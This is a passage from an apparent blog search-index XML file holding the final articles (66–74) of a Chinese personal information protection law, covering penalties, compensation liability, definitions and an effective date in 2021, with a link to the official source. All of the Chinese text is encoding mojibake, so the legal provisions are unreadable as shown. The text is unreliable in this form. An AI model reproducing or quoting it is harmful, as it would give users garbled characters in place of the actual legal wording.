é»‘ä½“;">ç¬¬å…­åå…­æ¡</span>ã€€è¿åæœ¬æ³•è§„å®šå¤„ç†ä¸ªäººä¿¡æ¯ï¼Œæˆ–è€…å¤„ç†ä¸ªäººä¿¡æ¯æœªå±¥è¡Œæœ¬æ³•è§„å®šçš„ä¸ªäººä¿¡æ¯ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œæ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¯¹è¿æ³•å¤„ç†ä¸ªäººä¿¡æ¯çš„åº”ç”¨ç¨‹åºï¼Œè´£ä»¤æš‚åœæˆ–è€…ç»ˆæ­¢æä¾›æœåŠ¡ï¼›æ‹’ä¸æ”¹æ­£çš„ï¼Œå¹¶å¤„ä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;">æœ‰å‰æ¬¾è§„å®šçš„è¿æ³•è¡Œä¸ºï¼Œæƒ…èŠ‚ä¸¥é‡çš„ï¼Œç”±çœçº§ä»¥ä¸Šå±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œæ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¹¶å¤„äº”åƒä¸‡å…ƒä»¥ä¸‹æˆ–è€…ä¸Šä¸€å¹´åº¦è¥ä¸šé¢ç™¾åˆ†ä¹‹äº”ä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡æˆ–è€…åœä¸šæ•´é¡¿ã€é€šæŠ¥æœ‰å…³ä¸»ç®¡éƒ¨é—¨åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥å†³å®šç¦æ­¢å…¶åœ¨ä¸€å®šæœŸé™å†…æ‹…ä»»ç›¸å…³ä¼ä¸šçš„è‘£äº‹ã€ç›‘äº‹ã€é«˜çº§ç®¡ç†äººå‘˜å’Œä¸ªäººä¿¡æ¯ä¿æŠ¤è´Ÿè´£äººã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åä¸ƒæ¡</span>ã€€æœ‰æœ¬æ³•è§„å®šçš„è¿æ³•è¡Œä¸ºçš„ï¼Œä¾ç…§æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šè®°å…¥ä¿¡ç”¨æ¡£æ¡ˆï¼Œå¹¶äºˆä»¥å…¬ç¤ºã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åå…«æ¡</span>ã€€å›½å®¶æœºå…³ä¸å±¥è¡Œæœ¬æ³•è§„å®šçš„ä¸ªäººä¿¡æ¯ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±å…¶ä¸Šçº§æœºå…³æˆ–è€…å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p style="text-indent: 2em;">å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨çš„å·¥ä½œäººå‘˜ç©å¿½èŒå®ˆã€æ»¥ç”¨èŒæƒã€å¾‡ç§èˆå¼Šï¼Œå°šä¸æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åä¹æ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯ä¾µå®³ä¸ªäººä¿¡æ¯æƒç›Šé€ æˆæŸå®³ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…ä¸èƒ½è¯æ˜è‡ªå·±æ²¡æœ‰è¿‡é”™çš„ï¼Œåº”å½“æ‰¿æ‹…æŸå®³èµ”å¿ç­‰ä¾µæƒè´£ä»»ã€‚</p><p style="text-indent: 2em;">å‰æ¬¾è§„å®šçš„æŸå®³èµ”å¿è´£ä»»æŒ‰ç…§ä¸ªäººå› æ­¤å—åˆ°çš„æŸå¤±æˆ–è€…ä¸ªäººä¿¡æ¯å¤„ç†è€…å› æ­¤è·å¾—çš„åˆ©ç›Šç¡®å®š;ä¸ªäººå› æ­¤å—åˆ°çš„æŸå¤±å’Œä¸ªäººä¿¡æ¯å¤„ç†è€…å› æ­¤è·å¾—çš„åˆ©ç›Šéš¾ä»¥ç¡®å®šçš„ï¼Œæ ¹æ®å®é™…æƒ…å†µç¡®å®šèµ”å¿æ•°é¢ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒåæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…è¿åæœ¬æ³•è§„å®šå¤„ç†ä¸ªäººä¿¡æ¯ï¼Œä¾µå®³ä¼—å¤šä¸ªäººçš„æƒç›Šçš„ï¼Œäººæ°‘æ£€å¯Ÿé™¢ã€æ³•å¾‹è§„å®šçš„æ¶ˆè´¹è€…ç»„ç»‡å’Œç”±å›½å®¶ç½‘ä¿¡éƒ¨é—¨ç¡®å®šçš„ç»„ç»‡å¯ä»¥ä¾æ³•å‘äººæ°‘æ³•é™¢æèµ·è¯‰è®¼ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒåä¸€æ¡</span>ã€€è¿åæœ¬æ³•è§„å®šï¼Œæ„æˆè¿åæ²»å®‰ç®¡ç†è¡Œä¸ºçš„ï¼Œä¾æ³•ç»™äºˆæ²»å®‰ç®¡ç†å¤„ç½šï¼›æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬å…«ç« ã€€é™„ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒåäºŒæ¡</span>ã€€è‡ªç„¶äººå› ä¸ªäººæˆ–è€…å®¶åº­äº‹åŠ¡å¤„ç†ä¸ªäººä¿¡æ¯çš„ï¼Œä¸é€‚ç”¨æœ¬æ³•ã€‚</p><p style="text-indent: 2em;">æ³•å¾‹å¯¹å„çº§äººæ°‘æ”¿åºœåŠå…¶æœ‰å…³éƒ¨é—¨ç»„ç»‡å®æ–½çš„ç»Ÿè®¡ã€æ¡£æ¡ˆç®¡ç†æ´»åŠ¨ä¸­çš„ä¸ªäººä¿¡æ¯å¤„ç†æœ‰è§„å®šçš„ï¼Œé€‚ç”¨å…¶è§„å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒåä¸‰æ¡</span>ã€€æœ¬æ³•ä¸‹åˆ—ç”¨è¯­çš„å«ä¹‰ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…ï¼Œæ˜¯æŒ‡åœ¨ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ä¸­è‡ªä¸»å†³å®šå¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼çš„ç»„ç»‡ã€ä¸ªäººã€‚</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰è‡ªåŠ¨åŒ–å†³ç­–ï¼Œæ˜¯æŒ‡é€šè¿‡è®¡ç®—æœºç¨‹åºè‡ªåŠ¨åˆ†æã€è¯„ä¼°ä¸ªäººçš„è¡Œä¸ºä¹ æƒ¯ã€å…´è¶£çˆ±å¥½æˆ–è€…ç»æµã€å¥åº·ã€ä¿¡ç”¨çŠ¶å†µç­‰ï¼Œå¹¶è¿›è¡Œå†³ç­–çš„æ´»åŠ¨ã€‚</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰å»æ ‡è¯†åŒ–ï¼Œæ˜¯æŒ‡ä¸ªäººä¿¡æ¯ç»è¿‡å¤„ç†ï¼Œä½¿å…¶åœ¨ä¸å€ŸåŠ©é¢å¤–ä¿¡æ¯çš„æƒ…å†µä¸‹æ— æ³•è¯†åˆ«ç‰¹å®šè‡ªç„¶äººçš„è¿‡ç¨‹ã€‚</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰åŒ¿ååŒ–ï¼Œæ˜¯æŒ‡ä¸ªäººä¿¡æ¯ç»è¿‡å¤„ç†æ— æ³•è¯†åˆ«ç‰¹å®šè‡ªç„¶äººä¸”ä¸èƒ½å¤åŸçš„è¿‡ç¨‹ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒåå››æ¡</span>ã€€æœ¬æ³•è‡ª2021å¹´11æœˆ1æ—¥èµ·æ–½è¡Œã€‚</p><p><strong>åŸæ–‡é“¾æ¥ï¼š<a href="http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml">http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‡ç­¾</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
